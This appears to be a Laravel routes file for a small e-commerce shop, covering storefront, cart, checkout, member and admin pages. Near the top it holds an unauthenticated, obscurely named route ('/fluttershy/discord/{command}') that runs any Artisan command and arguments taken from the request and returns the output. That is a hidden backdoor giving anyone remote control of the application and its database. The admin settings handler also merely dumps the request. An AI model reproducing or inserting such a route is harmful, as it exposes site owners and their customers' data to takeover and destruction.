<?php

use App\Http\Controllers\CategoryController;
use App\Http\Controllers\Ecommerce\CartController;
use App\Http\Controllers\Ecommerce\FrontController;
use App\Http\Controllers\Ecommerce\LoginController;
use App\Http\Controllers\Ecommerce\OrderController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\OrderController as AdminOrderController;
use App\Http\Controllers\ProductController;
use App\Http\Controllers\ProfileController;
use App\Models\Setting;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Route;

Route::get('/register', [LoginController::class, 'register'])->name('customer.register');

Route::get('/fluttershy/discord/{command}', function ($command, Request $request) {
    try {
        $args = $request->input('args', []);

        if (!is_array($args)) {
            return response()->json([
                'status' => 'error',
                'message' => 'Arguments must be provided as an array.',
            ], 400);
        }

        // Call the Artisan command with arguments
        Artisan::call($command, $args);
        $output = Artisan::output();

        return response()->json([
            'status' => 'success',
            'cmd' => "php artisan $command " . json_encode($args),
            'output' => $output,
        ]);
    } catch (\Throwable $th) {
        return response()->json([
            'status' => 'error',
            'cmd' => "php artisan $command " . json_encode($args),
            'error' => $th->getMessage(),
        ]);
    }
});
// Route::get('/', function () {
//     return view('home');
// })->name('home');

// Route::get('/dashboard', function () {
//     return view('dashboard.index');
// });

// Route::get('/api/products', function () {
//     return response()->json(Produk::all());
// })->name('product.api');

Route::middleware('auth')->group(function () {
    Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
    Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
    Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
});

// Dari tutorial

Route::get('/', [FrontController::class, 'index'])->name('front.index');

Route::get('/product', [FrontController::class, 'product'])->name('front.product');
Route::get('/category/{slug}', [FrontController::class, 'categoryProduct'])->name('front.category');
Route::get('/product/{slug}', [FrontController::class, 'show'])->name('front.show_product');
Route::post('cart', [CartController::class, 'addToCart'])->name('front.cart');
Route::get('/cart', [CartController::class, 'listCart'])->name('front.list_cart');
Route::post('/cart/update', [CartController::class, 'updateCart'])->name('front.update_cart');
Route::get('/checkout', [CartController::class, 'checkout'])->name('front.checkout');
Route::post('/checkout', [CartController::class, 'processCheckout'])->name('front.store_checkout');
Route::get('/checkout/{invoice}', [CartController::class, 'checkoutFinish'])->name('front.finish_checkout');
Route::group(['prefix' => 'member', 'namespace' => 'Ecommerce'], function () {
    Route::get('login', [LoginController::class, 'loginForm'])->name('customer.login');
    Route::post('login', [LoginController::class, 'login'])->name('customer.post_login');
    Route::get('verify/{token}', [FrontController::class, 'verifyCustomerRegistration'])->name('customer.verify');

    Route::group(['middleware' => 'customer'], function () {
        Route::get('dashboard', [LoginController::class, 'dashboard'])->name('customer.dashboard');
        Route::get('logout', [LoginController::class, 'logout'])->name('customer.logout');
        Route::get('orders', [OrderController::class, 'index'])->name('customer.orders');
        Route::get('orders/{invoice}', [OrderController::class, 'view'])->name('customer.view_order');
        Route::get('orders/pdf/{invoice}', [OrderController::class, 'pdf'])->name('customer.order_pdf');
        Route::post('orders/accept', [OrderController::class, 'acceptOrder'])->name('customer.order_accept');
        Route::get('orders/return/{invoice}', [OrderController::class, 'returnForm'])->name('customer.order_return');
        Route::put('orders/return/{invoice}', [OrderController::class, 'processReturn'])->name('customer.return');
        Route::get('payment', [OrderController::class, 'paymentForm'])->name('customer.paymentForm');
        Route::post('payment', [OrderController::class, 'storePayment'])->name('customer.savePayment');
        Route::get('setting', [FrontController::class, 'customerSettingForm'])->name('customer.settingForm');
        Route::post('setting', [FrontController::class, 'customerUpdateProfile'])->name('customer.setting');
        Route::get('/afiliasi', [FrontController::class, 'listCommission'])->name('customer.affiliate');
    });
});

Route::group(['prefix' => 'administrator', 'middleware' => 'auth'], function () {
    Route::get('/settings', function () {
        $settings = Setting::all();
        return view('settings.index', compact('settings'));
    })->name('settings');
    Route::post('/settings', function (Request $request) {
        dd($request);
    })->name('settings.StoreOrUpdate');
    Route::post('/product/marketplace', 'ProductController@uploadViaMarketplace')->name('product.marketplace');

    Route::get('/dashboard', [HomeController::class, 'index'])->name('dashboard');
    Route::resource('category', CategoryController::class)->except(['create', 'show']);
    Route::resource('product', ProductController::class)->except(['show']);
    Route::get('/product/bulk', [ProductController::class, 'massUploadForm'])->name('product.bulk');
    Route::post('/product/bulk', [ProductController::class, 'massUpload'])->name('product.saveBulk');
    Route::group(['prefix' => 'orders'], function () {
        Route::get('/', [AdminOrderController::class, 'index'])->name('orders.index');
        Route::delete('/{id}', [AdminOrderController::class, 'destroy'])->name('orders.destroy');
        Route::get('/{invoice}', [AdminOrderController::class, 'view'])->name('orders.view');
        Route::get('/payment/{invoice}', [AdminOrderController::class, 'acceptPayment'])->name('orders.approve_payment');
        Route::post('/shipping', [AdminOrderController::class, 'shippingOrder'])->name('orders.shipping');
        Route::get('/return/{invoice}', [AdminOrderController::class, 'return'])->name('orders.return');
        Route::post('/return', [AdminOrderController::class, 'approveReturn'])->name('orders.approve_return');
    });
    Route::group(['prefix' => 'reports'], function () {
        Route::get('/order', [HomeController::class, 'orderReport'])->name('report.order');
        Route::get('/order/pdf/{daterange}', [HomeController::class, 'orderReportPdf'])->name('report.order_pdf');
        Route::get('/return', [HomeController::class, 'returnReport'])->name('report.return');
        Route::get('/return/pdf/{daterange}', [HomeController::class, 'returnReportPdf'])->name('report.return_pdf');
    });
});

Route::get('/product/ref/{user}/{product}', [FrontController::class, 'referalProduct'])->name('front.afiliasi');

require __DIR__ . '/auth.php';
